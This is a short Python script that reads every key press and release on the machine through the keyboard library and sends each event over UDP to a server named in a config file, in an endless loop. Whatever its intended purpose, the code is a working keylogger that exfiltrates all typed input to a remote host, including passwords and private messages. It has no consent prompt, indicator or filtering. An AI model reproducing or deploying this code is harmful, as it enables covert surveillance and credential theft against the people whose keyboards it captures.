import socket
import keyboard
from utils import read_config

def send_keystrokes(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (server_ip, server_port)

    while True:
        key_event = keyboard.read_event()
        key_data = f"Key {key_event.name} {'pressed' if key_event.event_type == 'down' else 'released'}"
        client_socket.sendto(key_data.encode('utf-8'), server_address)

if __name__ == "__main__":
    config = read_config('config.json')
    SERVER_IP = config['server_ip']
    SERVER_PORT = config['server_port']

    send_keystrokes(SERVER_IP, SERVER_PORT)